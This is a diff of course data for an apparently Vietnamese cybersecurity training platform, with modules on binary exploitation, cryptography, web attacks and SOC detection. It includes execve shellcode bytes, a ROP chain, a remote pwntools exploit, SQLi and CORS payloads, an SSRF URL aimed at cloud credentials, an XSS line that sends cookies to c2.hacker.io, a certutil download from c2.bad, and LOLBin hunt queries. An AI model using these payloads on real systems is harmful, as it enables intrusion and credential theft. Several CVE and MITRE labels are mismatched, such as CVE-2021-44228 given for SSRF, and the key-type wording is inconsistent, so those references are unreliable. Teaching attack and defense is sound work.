+            "ASLR (Address Space Layout Randomization)",
+            "DEP (Data Execution Prevention)",
+            "Chế độ SafeSEH"
+          ],
+          "correct": 0,
+          "explanation": "Stack Canary đặt một giá trị bí mật trước Saved RIP. Khi hàm kết thúc, compiler kiểm tra xem canary có bị thay đổi không; nếu bị thay đổi, chương trình sẽ crash ngay lập tức qua __stack_chk_fail."
+        }
+      },
+      {
+        "id": "s4",
+        "title": "Kỹ Thuật Viết Shellcode Linux x86_64 Không Chứa Byte Null",
+        "duration": "4h 15m",
+        "objective": "Tự tay viết mã máy x86_64 assembly gọi syscall execve('/bin/sh', NULL, NULL) và loại bỏ hoàn toàn các byte 0x00.",
+        "mitre": "T1059 - Trình thông dịch lệnh và script",
+        "cve": "Shellcode Crafting: Linux x86_64 Execve Stager",
+        "theory": "Hàm strcpy và các hàm chuỗi trong C coi byte 0x00 (Null Byte) là ký tự kết thúc chuỗi. Nếu shellcode chứa 0x00, nó sẽ bị cắt cụt. Để tránh byte null, hacker sử dụng các thanh ghi con (như AL thay vì RAX) hoặc dùng lệnh XOR thanh ghi với chính nó (xor eax, eax) để tạo giá trị 0 mà không dùng mã máy 0x00.",
+        "codeSnippet": "; Shellcode x86_64 không chứa byte Null:\nglobal _start\nsection .text\n_start:\n    xor rsi, rsi           ; argv = NULL\n    push rsi               ; Đẩy byte null kết thúc chuỗi\n    mov rdi, 0x68732f2f6e69622f ; chuỗi \"/bin//sh\" dưới dạng hex little-endian\n    push rdi\n    mov rdi, rsp           ; rdi trỏ tới chuỗi \"/bin//sh\"\n    push 59                ; 59 là số hiệu syscall của sys_execve\n    pop rax\n    cdq                    ; rdx = NULL\n    syscall                ; Kích hoạt thực thi shell",
+        "codeLanguage": "assembly",
+        "payloadExample": "\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05",
+        "secureSnippet": "// Bật tính năng Non-Executable Stack (NX/DEP):\n// gcc -z noexecstack -o protected_binary source.c",
+        "quiz": {
+          "question": "Số hiệu System Call (Syscall Number) của hàm 'sys_execve' trên hệ điều hành Linux x86_64 là bao nhiêu?",
+          "options": [
+            "59 (0x3b)",
+            "1 (sys_exit)",
+            "11 (Linux 32-bit execve)",
+            "60 (sys_exit64)"
+          ],
+          "correct": 0,
+          "explanation": "Trên kiến trúc Linux 64-bit, syscall số 59 (0x3b) ứng với hàm execve, được nạp vào thanh ghi RAX trước khi thực thi lệnh 'syscall'."
+        }
+      },
+      {
+        "id": "s5",
+        "title": "Xây Dựng Chuỗi ROP (Return-Oriented Programming) & Bypass Bảo Vệ ASLR/NX",
+        "duration": "5h 00m",
+        "objective": "Vượt qua cơ chế cấm thực thi vùng stack (NX/DEP) bằng cách ghép các đoạn mã Gadget kết thúc bằng lệnh 'ret' để gọi system('/bin/sh').",
+        "mitre": "T1055 - Return-Oriented Programming (ROP)",
+        "cve": "Bypass Mitigations: DEP/NX and ASLR Exploitation",
+        "theory": "Khi cờ NX (No-Execute) được bật, vùng stack không thể chứa mã thực thi. Kỹ thuật ROP tận dụng các đoạn mã ngắn có sẵn trong file binary hoặc thư viện libc kết thúc bằng lệnh 'ret' (gọi là Gadgets). Bằng cách sắp xếp các địa chỉ gadget trên stack, kẻ tấn công điều khiển các thanh ghi và gọi hàm system() của thư viện C mà không cần chèn shellcode mới.",
+        "codeSnippet": "# Xây dựng chuỗi ROP bằng ROPgadget và pwntools:\n# Gadget 1: pop rdi ; ret  (Để nạp chuỗi \"/bin/sh\" vào tham số 1)\nPOP_RDI = 0x000000000040120b\nBIN_SH  = 0x0000000000404050\nSYSTEM  = 0x0000000000401030\n\nrop_chain = b\"A\" * 72\nrop_chain += p64(POP_RDI)\nrop_chain += p64(BIN_SH)\nrop_chain += p64(SYSTEM)",
+        "codeLanguage": "python",
+        "payloadExample": "ROPgadget --binary ./vuln_elf --ropchain",
+        "secureSnippet": "// Khuyến nghị biên dịch với bảo vệ tối đa:\n// gcc -fPIE -pie -Wl,-z,relro,-z,now -fstack-protector-strong -o hardened_binary main.c",
+        "quiz": {
+          "question": "Lệnh hợp ngữ nào bắt buộc phải kết thúc ở cuối mỗi đoạn Gadget trong một chuỗi ROP Chain kinh điển?",
+          "options": [
+            "ret (Return)",
+            "call",
+            "jmp",
+            "nop"
+          ],
+          "correct": 0,
+          "explanation": "Mỗi ROP Gadget phải kết thúc bằng lệnh 'ret' để lấy địa chỉ của gadget tiếp theo từ đỉnh stack và tiếp tục chuỗi điều khiển."
+        }
+      },
+      {
+        "id": "s6",
+        "title": "Thao Trường Binary Capstone: Khai Thác Dịch Vụ Mạng Network Daemon Chiếm Quyền Root",
+        "duration": "4h 45m",
+        "objective": "Dịch ngược một dịch vụ TCP daemon từ xa, bypass ASLR qua lỗi rò rỉ địa chỉ bộ nhớ (Info Leak) và mở interactive root shell.",
+        "mitre": "T1203 & T1059 - Khai thác dịch vụ daemon từ xa",
+        "cve": "Remote Network Daemon Exploitation Challenge",
+        "theory": "Trong thử thách đỉnh cao này, học viên kết hợp toàn bộ kỹ năng: dịch ngược nhị phân từ xa, tìm lỗi Format String hoặc Off-by-one để rò rỉ địa chỉ Libc cơ sở (Libc Base Address Leak), tính toán offset của hàm system(), xây dựng ROP chain vượt qua ASLR và giành quyền kiểm soát máy chủ từ xa.",
+        "codeSnippet": "from pwn import *\n# Kết nối dịch vụ từ xa\nconn = remote('10.10.14.89', 9001)\n# Bước 1: Trích xuất địa chỉ rò rỉ libc puts\nconn.recvuntil(b\"Enter Token:\")\nconn.sendline(b\"%15$p\")\nlibc_leak = int(conn.recvline().strip(), 16)\nlibc_base = libc_leak - 0x21bf7\n# Bước 2: Bắn ROP payload giành root shell\nconn.sendline(craft_rop(libc_base))\nconn.interactive()",
+        "codeLanguage": "python",
+        "payloadExample": "nc 10.10.14.89 9001",
+        "secureSnippet": "# Phòng vệ toàn diện:\n# 1. Bật ASLR toàn hệ thống: echo 2 > /proc/sys/kernel/randomize_va_space\n# 2. Sử dụng Seccomp BPF lọc bỏ các syscall nguy hiểm",
+        "quiz": {
+          "question": "Cơ chế bảo vệ ASLR (Address Space Layout Randomization) thường bị kẻ tấn công vượt qua bằng phương pháp nào?",
+          "options": [
+            "Lợi dụng một lỗ hổng rò rỉ thông tin bộ nhớ (Information Leak) để tính toán địa chỉ gốc (Base Address)",
+            "Chờ máy chủ khởi động lại",
+            "Tăng kích thước gói tin gửi đi gấp đôi",
+            "Sử dụng giao thức HTTPS thay vì HTTP"
+          ],
+          "correct": 0,
+          "explanation": "ASLR ngẫu nhiên hóa vị trí nạp của thư viện, nhưng khoảng cách (offset) giữa các hàm trong cùng một thư viện luôn cố định. Khi rò rỉ được 1 địa chỉ, hacker tính được địa chỉ gốc và mọi hàm khác."
+        }
+      }
+    ]
+  },
+  {
+    "id": "mod-sec101",
+    "code": "SEC-101",
+    "category": "defensive",
+    "track": "Kỹ Thuật Mật Mã / Phòng Thủ Mật Mã Ứng Dụng",
+    "title": "Mật Mã Học Thực Hành, Giao Thức TLS/SSL & Hạ Tầng Khóa Công Khai PKI",
+    "difficulty": "Cơ Bản",
+    "difficultyKey": "novice",
+    "duration": "12 Giờ Học",
+    "lessonsCount": 4,
+    "labsCount": 2,
+    "enrolledCount": "4,680",
+    "mitre": "T1573 / T1587.003",
+    "cert": "Security+ / CISSP Domain 3",
+    "cvssBase": "7.5 HIGH",
+    "threatProfile": "Lỗ Hổng Thuật Toán Mã Hóa & Giả Mạo Chứng Chỉ Số",
+    "description": "Nắm vững nguyên lý mật mã học đối xứng và bất đối xứng, thuật toán băm an toàn và chứng chỉ số X.509. Thực hành cấu hình an toàn cho AES-256-GCM, RSA, Elliptic Curves và giải mã bắt tay TLS 1.3.",
+    "labLink": "/labs",
+    "labId": "lab-06",
+    "syllabus": [
+      {
+        "id": "s1",
+        "title": "Mã Hóa Khóa Đối Xứng: Chế Độ Khối Block Ciphers & Chuẩn AES-GCM",
+        "duration": "2h 30m",
+        "objective": "So sánh chế độ ECB, CBC và GCM, hiểu vì sao ECB không an toàn và làm chủ mã hóa chứng thực Galois/Counter Mode.",
+        "mitre": "T1573 - Mã hóa kênh truyền thông tin",
+        "cve": "CWE-327: Sử Dụng Thuật Toán Mật Mã Bị Lỗi Thời (ECB Mode Penguin)",
+        "theory": "AES là thuật toán mã hóa khối tiêu chuẩn toàn cầu. Tuy nhiên, chế độ hoạt động (Block Cipher Mode) quyết định độ an toàn thực tế. Chế độ ECB mã hóa các khối dữ liệu giống nhau thành bản mã giống hệt nhau, làm lộ hình dáng và cấu trúc của dữ liệu ban đầu. Chế độ AES-GCM vừa mã hóa vừa cung cấp tính toàn vẹn (Authenticated Encryption with Associated Data - AEAD).",
+        "codeSnippet": "// Mã hóa an toàn với Node.js Crypto (AES-256-GCM):\nconst crypto = require('crypto');\n\nfunction encrypt(text, secretKey) {\n  const iv = crypto.randomBytes(12); // Chuẩn IV 12 bytes cho GCM\n  const cipher = crypto.createCipheriv('aes-256-gcm', secretKey, iv);\n  let encrypted = cipher.update(text, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  const authTag = cipher.getAuthTag().toString('hex');\n  return { iv: iv.toString('hex'), encrypted, authTag };\n}",
+        "codeLanguage": "javascript",
+        "payloadExample": "openssl enc -aes-256-gcm -in secret.txt -out secret.enc -k MyStrongPass",
+        "secureSnippet": "// Luôn sử dụng AES-256-GCM hoặc ChaCha20-Poly1305\n// Tuyệt đối không bao giờ tái sử dụng cùng một cặp (Key, IV) trong chế độ GCM",
+        "quiz": {
+          "question": "Tại sao chế độ mã hóa AES-ECB (Electronic Codebook) TUYỆT ĐỐI KHÔNG ĐƯỢC PHÉP sử dụng cho dữ liệu lớn hơn 16 bytes?",
+          "options": [
+            "Các khối dữ liệu đầu vào giống nhau sẽ sinh ra các khối bản mã giống hệt nhau, làm lộ quy luật dữ liệu gốc",
+            "ECB chạy quá chậm so với CBC",
+            "ECB chỉ hỗ trợ mật khẩu 8 ký tự",
+            "ECB yêu cầu kết nối Internet liên tục"
+          ],
+          "correct": 0,
+          "explanation": "ECB mã hóa từng khối độc lập mà không dùng vector khởi tạo (IV). Do đó, các khối plain-text giống nhau tạo ra cipher-text giống hệt nhau (minh chứng qua hình ảnh chú chim cánh cụt ECB Penguin nổi tiếng)."
+        }
+      },
+      {
+        "id": "s2",
+        "title": "Mật Mã Khóa Bất Đối Xứng: RSA, Trao Đổi Khóa Diffie-Hellman & Đường Cong Elliptic (ECC)",
+        "duration": "3h 15m",
+        "objective": "Hiểu cặp khóa Public/Private, số học modulo, trao đổi khóa ECDH và nguyên lý bảo mật tương lai Forward Secrecy.",
+        "mitre": "T1573 - Mật mã bất đối xứng",
+        "cve": "Cryptographic Key Exchange & Forward Secrecy",
+        "theory": "Mật mã bất đối xứng sử dụng cặp khóa khác nhau: Khóa công khai (Public Key) dùng để mã hóa hoặc kiểm tra chữ ký, Khóa bí mật (Private Key) dùng để giải mã hoặc tạo chữ ký số. Đường cong Elliptic (ECC / Curve25519) cung cấp độ an toàn tương đương RSA 3072-bit nhưng với kích thước khóa chỉ 256-bit, tiết kiệm băng thông và tăng tốc xử lý.",
+        "codeSnippet": "// Tạo cặp khóa Elliptic Curve X25519 an toàn trong OpenSSL:\nopenssl genpkey -algorithm ED25519 -out private_key.pem\nopenssl pkey -in private_key.pem -pubout -out public_key.pem",
+        "codeLanguage": "bash",
+        "payloadExample": "ssh-keygen -t ed25519 -C \"admin@cyber-range.vn\"",
+        "secureSnippet": "// Khuyến nghị quản trị khóa:\n// 1. Chuyển đổi từ RSA 2048 sang Ed25519 hoặc RSA 4096-bit\n// 2. Kích hoạt Ephemeral Diffie-Hellman (ECDHE) để đảm bảo Perfect Forward Secrecy",
+        "quiz": {
+          "question": "Tính chất nào (Perfect Forward Secrecy - PFS) đảm bảo rằng các phiên giao tiếp đã ghi lại trong quá khứ không thể bị giải mã ngay cả khi khóa bí mật của server bị đánh cắp sau này?",
+          "options": [
+            "Tạo khóa phiên tạm thời (Ephemeral Session Keys) duy nhất cho mỗi phiên kết nối",
+            "Sử dụng mật khẩu dài hơn 50 ký tự",
+            "Mã hóa file bằng phần mềm WinRAR",
+            "Đổi địa chỉ IP máy chủ hàng tuần"
+          ],
+          "correct": 0,
+          "explanation": "Perfect Forward Secrecy (PFS) sử dụng các tham số Diffie-Hellman tạm thời (Ephemeral ECDHE) và hủy khóa phiên ngay sau khi kết thúc, khiến việc lộ khóa private dài hạn của server không thể giải mã các phiên cũ."
+        }
+      },
+      {
+        "id": "s3",
+        "title": "Thuật Toán Băm Mật Mã & Cơ Chế Chữ Ký Khối HMAC Chống Giả Mạo",
+        "duration": "2h 45m",
+        "objective": "Phân biệt hàm băm nhanh (SHA-256) và hàm băm mật khẩu chậm có salt (Argon2, bcrypt), và ký số API bằng HMAC-SHA256.",
+        "mitre": "T1003 - Tấn công bẻ khóa mật khẩu đã băm",
+        "cve": "CWE-328: Sử Dụng Hàm Băm Yếu (MD5 / SHA1 Collisions)",
+        "theory": "Hàm băm là hàm một chiều không thể đảo ngược. MD5 và SHA-1 đã bị phá vỡ hoàn toàn bởi các cuộc tấn công tìm xung đột (Collision Attack). Khi lưu trữ mật khẩu người dùng, TUYỆT ĐỐI KHÔNG dùng SHA-256 vì GPU có thể tính toán hàng tỷ hash mỗi giây. Bắt buộc phải sử dụng các thuật toán chậm có kiểm soát bộ nhớ như Argon2id hoặc bcrypt.",
+        "codeSnippet": "// Xác thực chữ ký HMAC-SHA256 bảo vệ Webhook:\nconst crypto = require('crypto');\n\nfunction verifyWebhook(payload, signature, secret) {\n  const hmac = crypto.createHmac('sha256', secret);\n  const calculated = 'sha256=' + hmac.update(payload).digest('hex');\n  // So sánh chuỗi an toàn chống Timing Attack:\n  return crypto.timingSafeEqual(Buffer.from(signature), Buffer.from(calculated));\n}",
+        "codeLanguage": "javascript",
+        "payloadExample": "echo -n \"user=admin&role=root\" | openssl dgst -sha256 -hmac \"SecretKey\"",
+        "secureSnippet": "// Băm mật khẩu người dùng chuẩn Argon2id:\nconst argon2 = require('argon2');\nconst hash = await argon2.hash(password, {\n  type: argon2.argon2id,\n  memoryCost: 65536, // 64 MB RAM\n  timeCost: 3        // 3 iterations\n});",
+        "quiz": {
+          "question": "Thuật toán băm mật khẩu nào đã giành chiến thắng trong Cuộc thi Hashing Mật khẩu Quốc tế (PHC) và được khuyến nghị sử dụng hàng đầu hiện nay?",
+          "options": [
+            "Argon2 (đặc biệt là biến thể Argon2id)",
+            "MD5",
+            "SHA-256",
+            "DES"
+          ],
+          "correct": 0,
+          "explanation": "Argon2 là chuẩn mã hóa mật khẩu hiện đại nhất, kết hợp khả năng chống tấn công brute-force bằng GPU lẫn tấn công Trade-off bộ nhớ/thời gian."
+        }
+      },
+      {
+        "id": "s4",
+        "title": "Hạ Tầng Khóa Công Khai PKI, Nhà Xác Thực CA & Giải Mã Bắt Tay TLS 1.3",
+        "duration": "3h 30m",
+        "objective": "Kiểm tra chuỗi chứng chỉ X.509, phát hiện chứng chỉ bị thu hồi/hết hạn và hiểu quy trình tối ưu hóa bắt tay 1-RTT của TLS 1.3.",
+        "mitre": "T1587.003 - Chứng chỉ số giả mạo",
+        "cve": "TLS Protocol Downgrade Attacks & Certificate Validation",
+        "theory": "Hạ tầng khóa công khai (PKI) dựa trên các tổ chức chứng thực Certificate Authorities (CA) đáng tin cậy. TLS 1.3 loại bỏ hoàn toàn các thuật toán mật mã cũ không an toàn (RC4, 3DES, MD5, SHA-1) và cắt giảm quá trình bắt tay mật mã xuống chỉ còn 1 vòng truyền nhận (1-RTT), tăng tốc độ kết nối và bảo mật tuyệt đối.",
+        "codeSnippet": "# Kiểm tra thông tin chứng chỉ SSL/TLS của máy chủ qua OpenSSL:\nopenssl s_client -connect bank.com:443 -servername bank.com -tls1_3",
+        "codeLanguage": "bash",
+        "payloadExample": "openssl x509 -in cert.crt -text -noout",
+        "secureSnippet": "# Cấu hình Nginx bật TLS 1.3 và vô hiệu hóa TLS 1.0 / 1.1:\nssl_protocols TLSv1.2 TLSv1.3;\nssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;\nssl_prefer_server_ciphers off;\nadd_header Strict-Transport-Security \"max-age=63072000; includeSubDomains; preload\" always;",
+        "quiz": {
+          "question": "Giao thức TLS 1.3 hiện đại yêu cầu bao nhiêu vòng truyền nhận (Round-Trip Time - RTT) để hoàn tất quá trình bắt tay thiết lập phiên mã hóa đầy đủ?",
+          "options": [
+            "1 RTT (và 0-RTT cho việc khôi phục phiên)",
+            "3 RTT",
+            "5 RTT",
+            "Không cần RTT nào"
+          ],
+          "correct": 0,
+          "explanation": "TLS 1.3 tối ưu hóa quá trình bắt tay từ 2 RTT (trong TLS 1.2) xuống còn 1 RTT duy nhất bằng cách gửi các tham số chia sẻ khóa Diffie-Hellman ngay trong gói tin ClientHello."
+        }
+      }
+    ]
   }
-  next();
-});`,
-        codeLanguage: "javascript",
-        payloadExample: `curl -H "Origin: https://bank.com.attacker.site" -H "Cookie: session=eyJhZG1pbiI6dHJ1ZX0" https://api.bank.com/user/credentials -i`,
-        quiz: {
-          question: "Which CORS configuration combined with 'Access-Control-Allow-Credentials: true' is most critical?",
-          options: [
-            "Access-Control-Allow-Origin: * (Wildcard with credentials)",
-            "Access-Control-Allow-Origin dynamically reflecting arbitrary incoming Origin",
-            "Access-Control-Max-Age set to 86400",
-            "Access-Control-Allow-Methods: GET, POST",
-          ],
-          correct: 1,
-          explanation: "Browsers strictly reject '*' when credentials are true, but dynamically echoing untrusted request Origin headers bypasses this restriction and completely leaks sensitive user data.",
-        },
-      },
-      {
-        id: "s2",
-        title: "SQLi: Hex Encoding, Second-Order Injection & Parameterization",
-        duration: "3h 40m",
-        objective: "Evade Web Application Firewall (WAF) regexes using hex encoding and inline comment tricks, then enforce prepared statements.",
-        mitre: "T1190 - SQL Injection Exploitation",
-        cve: "CVE-2023-38606 / CWE-89",
-        theory:
-          "Second-Order SQL Injection occurs when malicious user input is stored safely by the initial application query (e.g. into a user profile table), but later retrieved and concatenated unsanitized into a secondary SQL query executed with administrative privileges.",
-        codeSnippet: `-- Second-Order Trigger in Admin Reporting Pipeline:
--- 1. Attacker registers username: admin'--
--- 2. Later, batch audit query concatenates the stored username:
-SELECT id, email, role FROM system_users 
-WHERE department = 'Finance' AND created_by = 'admin'--' AND status = 'active';`,
-        codeLanguage: "sql",
-        payloadExample: `admin' UNION SELECT null, flag_token, 'pwned' FROM cyber_flags-- -`,
-        quiz: {
-          question: "Why does WAF keyword blocking often fail against advanced SQL injection?",
-          options: [
-            "SQL keywords are case-insensitive and can be split with comments (e.g. UN/**/ION)",
-            "WAFs only inspect GET queries, never POST payloads",
-            "SQL databases automatically decode base64 without instructions",
-            "Database drivers ignore single quotes",
-          ],
-          correct: 0,
-          explanation: "SQL parsers treat inline comments '/**/' as whitespace, allowing attackers to fragment signature tokens that signature-based WAFs fail to detect.",
-        },
-      },
-      {
-        id: "s3",
-        title: "Cross-Site Scripting (XSS): DOM Sinks & Modern CSP Bypasses",
-        duration: "3h 10m",
-        objective: "Trace data flow from execution sources to dangerous DOM sinks (innerHTML, eval) and craft Content Security Policy (CSP) nonces bypasses.",
-        mitre: "T1059.007 - JavaScript Execution in Browser",
-        cve: "CWE-79: Cross-Site Scripting",
-        theory:
-          "DOM-based XSS occurs when user controllable data (location.search, document.referrer) is passed to execution sinks like element.innerHTML or document.write without prior sanitization via libraries like DOMPurify or Trusted Types API.",
-        codeSnippet: `// Vulnerable Client-Side Router Component:
-const params = new URLSearchParams(window.location.search);
-const redirectTarget = params.get('next');
-// DANGEROUS DOM SINK:
-document.getElementById('status-container').innerHTML = 
-  \`<p>Redirecting to <a href="\${redirectTarget}">here</a>...</p>\`;`,
-        codeLanguage: "javascript",
-        payloadExample: `javascript:fetch('https://c2.hacker.io/steal?c='+encodeURIComponent(document.cookie))`,
-        quiz: {
-          question: "Which browser API provides compile-time defense against DOM XSS injection?",
-          options: [
-            "Trusted Types (window.trustedTypes)",
-            "XMLHttpRequest API",
-            "Web Cryptography SubtleCrypto",
-            "Service Worker Cache API",
-          ],
-          correct: 0,
-          explanation: "Trusted Types enforces that strings cannot be directly assigned to dangerous DOM sinks unless wrapped in a validated TrustedHTML policy object.",
-        },
-      },
-      {
-        id: "s4",
-        title: "Server-Side Request Forgery (SSRF) & Cloud Metadata Extraction",
-        duration: "3h 30m",
-        objective: "Pivot from external web app to internal cloud metadata APIs (169.254.169.254) to exfiltrate temporary AWS IAM session tokens.",
-        mitre: "T1552.005 - Cloud Instance Metadata API",
-        cve: "CVE-2021-44228 / CWE-918",
-        theory:
-          "When web applications fetch remote URLs on behalf of users (image previewers, webhook dispatchers, PDF generators), attackers can supply link-local IP addresses (169.254.169.254) to query AWS/Azure metadata services and extract STS credentials.",
-        codeSnippet: `# Python vulnerable webhook dispatcher:
-import requests
-def fetch_webhook(url):
-    # Vulnerable: No IP validation or DNS pinning
-    response = requests.get(url, timeout=3)
-    return response.text`,
-        codeLanguage: "python",
-        payloadExample: `http://169.254.169.254/latest/meta-data/iam/security-credentials/ECS-Production-Role`,
-        quiz: {
-          question: "How does AWS IMDSv2 mitigate SSRF attacks compared to IMDSv1?",
-          options: [
-            "It requires a session token acquired via a PUT request with X-aws-ec2-metadata-token-ttl-seconds header",
-            "It disables HTTP completely and only uses TLS with client certificates",
-            "It moves the metadata IP to a public domain",
-            "It encrypts all EC2 disks automatically",
-          ],
-          correct: 0,
-          explanation: "IMDSv2 mandates obtaining a session token via an HTTP PUT request with custom headers, which simple GET-based SSRF vulnerabilities cannot easily forge.",
-        },
-      },
-      {
-        id: "s5",
-        title: "JWT Algorithm Confusion & Insecure Direct Object References (IDOR)",
-        duration: "2h 45m",
-        objective: "Exploit RS256 to HS256 algorithm confusion flaws to sign forged administrative JSON Web Tokens using public keys.",
-        mitre: "T1556 - Modify Authentication Process",
-        cve: "CWE-347: Improper Verification of Cryptographic Signature",
-        theory:
-          "In algorithm confusion attacks, a backend server configured for RSA (RS256) signature verification is tricked into accepting HMAC (HS256) when an attacker modifies the JWT header 'alg' field to 'HS256' and signs the token using the server's public RSA key as the secret HMAC key.",
-        codeSnippet: `// Vulnerable JWT Verification without explicit algorithm whitelist:
-const jwt = require('jsonwebtoken');
-function verifyToken(token) {
-  // FLUID VULNERABILITY: Takes algorithm directly from token header!
-  return jwt.verify(token, serverPublicKey); 
-}`,
-        codeLanguage: "javascript",
-        payloadExample: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJTRUNVUklUWV9BRE1JTiJ9.[HMAC_SHA256_WITH_PUBLIC_KEY]`,
-        quiz: {
-          question: "What is the proper remediation for JWT algorithm confusion?",
-          options: [
-            "Hardcode algorithms: ['RS256'] explicitly in the jwt.verify options",
-            "Encrypt the token with AES before transmitting",
-            "Double the length of the RSA key to 4096 bits",
-            "Store tokens in local storage instead of cookies",
-          ],
-          correct: 0,
-          explanation: "Explicitly whitelisting only the intended asymmetric algorithm ('RS256') prevents the parser from executing symmetric fallback verification.",
-        },
-      },
-      {
-        id: "s6",
-        title: "Capstone Lab: Enterprise Web Target Exploitation & Flag Capture",
-        duration: "3h 00m",
-        objective: "Chain together SSRF, SQLi filter evasion, and token forgery to achieve Remote Code Execution and capture the final root flag.",
-        mitre: "T1190 & T1059 - Chained Exploitation",
-        cve: "Enterprise Composite Scenario",
-        theory:
-          "Real-world enterprise penetration tests rarely succeed through isolated single bugs. Master the methodology of chaining low-severity information disclosure to authorization bypass, pivoting to internal administrative APIs, and achieving root container compromise.",
-        codeSnippet: `# Automated exploit chain runner:
-python3 exploit_chain.py \\
-  --target https://target-app.cyber-range.local \\
-  --vector ssrf-to-imds \\
-  --forge-admin-jwt \\
-  --dump-flag`,
-        codeLanguage: "bash",
-        payloadExample: `FLAG{WEB_EXPLOIT_CHAIN_CAPSTONE_PWNED}`,
-        quiz: {
-          question: "In an attack chain, what is the primary benefit of achieving SSRF to an internal microservice?",
-          options: [
-            "Bypassing perimeter firewalls and accessing unauthenticated internal administrative microservices",
-            "Increasing the victim server's CPU frequency",
-            "Decrypting HTTPS traffic on external routers",
-            "Cracking salted bcrypt passwords instantly",
-          ],
-          correct: 0,
-          explanation: "Internal service-to-service networks frequently rely on perimeter trust models and omit secondary authentication, making them ripe targets for SSRF pivots.",
-        },
-      },
-    ],
-  },
-  {
-    id: "mod-soc101",
-    code: "SOC-101",
-    category: "defensive",
-    track: "Blue Team / SOC Triage",
-    title: "SOC Operations, SIEM Threat Hunting & Elastic Logstash",
-    difficulty: "Novice",
-    duration: "14 Hours",
-    lessonsCount: 5,
-    labsCount: 3,
-    enrolledCount: "5,840",
-    mitre: "T1078 / T1053",
-    cert: "CompTIA Sec+ / CySA+",
-    cvssBase: "8.5 HIGH",
-    threatProfile: "Living-off-the-Land (LOLBins) & Active Directory Intrusion",
-    description:
-      "Develop Tier-1 & Tier-2 Security Operations Center competencies. Configure SIEM correlation rules in Elastic & Splunk, identify living-off-the-land binaries (LOLBins), and parse Windows Event Logs (Sysmon) for anomalous process spawns.",
-    labLink: "/labs",
-    labId: "lab-04",
-    syllabus: [
-      {
-        id: "s1",
-        title: "SOC Architecture, Triaging Workflows & Severity Matrix",
-        duration: "2h 00m",
-        objective: "Understand the Tier-1, Tier-2, and Tier-3 triage escalation lifecycle and calculate Mean Time to Detect (MTTD).",
-        mitre: "DEF-001 - Security Monitoring & Triaging",
-        cve: "NIST SP 800-61 Incident Handling Guide",
-        theory:
-          "Modern SOC workflows categorize alerts based on true-positive probability and asset criticality. Alert fatigue is mitigated through automated SOAR playbook enrichment (virustotal queries, IP geofencing, threat intel feeds) before analyst dispatch.",
-        codeSnippet: `// SOAR Playbook triage criteria:
-if (alert.severity >= 3 && alert.host.environment === 'Production') {
-  isolateEndpoint(alert.host.id);
-  enrichThreatIntel(alert.indicators);
-  dispatchUrgentTicket('SOC_TIER_2_TIAGE');
-}`,
-        codeLanguage: "javascript",
-        payloadExample: `event.dataset: "sysmon" AND winlog.event_id: 1 AND process.name: "powershell.exe"`,
-        quiz: {
-          question: "What metric measures the duration from when an adversary breaches a system until the SOC detects it?",
-          options: [
-            "MTTD (Mean Time To Detect) / Dwell Time",
-            "MTTR (Mean Time To Repair)",
-            "RTO (Recovery Time Objective)",
-            "SLA (Service Level Agreement)",
-          ],
-          correct: 0,
-          explanation: "MTTD (Mean Time to Detect) represents adversary dwell time in the environment prior to alarm generation.",
-        },
-      },
-      {
-        id: "s2",
-        title: "Windows Event Logs: Sysmon Event ID 1, 3, and 10 Analysis",
-        duration: "3h 15m",
-        objective: "Dissect Sysmon process creation (EID 1), network connections (EID 3), and process access / code injection (EID 10).",
-        mitre: "T1059.001 - PowerShell Execution / T1055 - Injection",
-        cve: "Sysmon Telemetry Pipeline",
-        theory:
-          "Sysmon provides granular kernel-level event telemetry. Event ID 1 records parent-child process relationships (e.g. WINWORD.EXE spawning powershell.exe is a classic phishing macro indicator), while Event ID 10 alerts on OpenProcess calls with VM_WRITE permissions.",
-        codeSnippet: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
-  <System><EventID>1</EventID></System>
-  <EventData>
-    <Data Name="ParentImage">C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE</Data>
-    <Data Name="Image">C:\\Windows\\System32\\cmd.exe</Data>
-    <Data Name="CommandLine">cmd.exe /c certutil.exe -urlcache -split -f http://c2.bad/payload.exe</Data>
-  </EventData>
-</Event>`,
-        codeLanguage: "xml",
-        payloadExample: `ParentImage:*WINWORD.EXE AND Image:*powershell.exe`,
-        quiz: {
-          question: "Which Sysmon Event ID directly indicates credential dumping attempts against lsass.exe?",
-          options: [
-            "Event ID 10 (ProcessAccess with TARGET LSASS.EXE and PROCESS_VM_READ)",
-            "Event ID 5 (Process Terminated)",
-            "Event ID 12 (Registry Object Created)",
-            "Event ID 22 (DNS Query)",
-          ],
-          correct: 0,
-          explanation: "Sysmon Event ID 10 alerts when a foreign process requests handles to LSASS memory with read/debug privileges.",
-        },
-      },
-      {
-        id: "s3",
-        title: "SIEM Threat Hunting Queries: Elastic KQL & Splunk SPL Syntax",
-        duration: "3h 30m",
-        objective: "Formulate proactive threat hunting queries across millions of log records using Elasticsearch KQL and Splunk SPL.",
-        mitre: "T1078 - Valid Accounts / T1003 - OS Credential Dumping",
-        cve: "Sigma Detection Standards",
-        theory:
-          "Proactive threat hunting assumes an attacker has already bypassed automated perimeter alerts. Analysts query for rare parent-child relationships, command-line entropy, and long-tail network destinations using aggregation pipes.",
-        codeSnippet: `// Splunk SPL Hunt for LOLBins command-line execution:
-index=windows EventCode=1 Image IN ("*\\\\certutil.exe", "*\\\\bitsadmin.exe", "*\\\\regsvr32.exe")
-| eval cmd_len = len(CommandLine)
-| where cmd_len > 120
-| stats count by host, User, ParentImage, CommandLine
-| sort - count`,
-        codeLanguage: "bash",
-        payloadExample: `process.name:(certutil.exe OR bitsadmin.exe) AND process.command_line:*urlcache*`,
-        quiz: {
-          question: "In Splunk SPL, what command groups matching events and counts their occurrences?",
-          options: ["stats count by [fields]", "search count", "eval match()", "dedup invert"],
-          correct: 0,
-          explanation: "| stats count by [field1, field2] is the primary aggregation command in Splunk SPL.",
-        },
-      },
-      {
-        id: "s4",
-        title: "Snort & Suricata IDS Rule Authoring for Command-and-Control",
-        duration: "2h 45m",
-        objective: "Write byte-level network intrusion detection rules targeting Cobalt Strike malleable C2 profiles and DNS exfiltration.",
